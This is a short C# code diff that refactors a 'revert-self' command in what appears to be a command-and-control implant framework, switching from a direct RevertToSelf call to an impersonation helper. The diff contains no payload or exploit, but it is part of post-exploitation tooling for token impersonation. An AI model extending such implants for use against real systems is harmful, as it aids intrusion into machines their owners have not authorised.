@@ -1,4 +1,5 @@
 ﻿using Agent.Commands;
+using Agent.Helpers;
 using Agent.Models;
 using System;
 using System.Collections.Generic;
@@ -16,17 +17,26 @@ namespace Commands
     public class RevertToSelfCommand : AgentCommand
     {
         public override string Name => "revert-self";
-        public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
-         
-            if (Agent.Native.Advapi.RevertToSelf())
+
+            /*if (Agent.Native.Advapi.RevertToSelf())
             {
-                result.Result += $"Reverted to self";
+                context.Result.Result += $"Reverted to self";
                 return;
             }
 
-            result.Result += $"Failed to revert";
-            return;
+            context.Result.Result += $"Failed to revert";
+            return;*/
+
+            if(!ImpersonationHelper.HasCurrentImpersonation)
+            {
+                context.Result.Result += $"No impersonation to revert";
+                return;
+            }
+
+            ImpersonationHelper.Reset();
+            context.Result.Result += $"Reverted to self";
         }
     }
 }
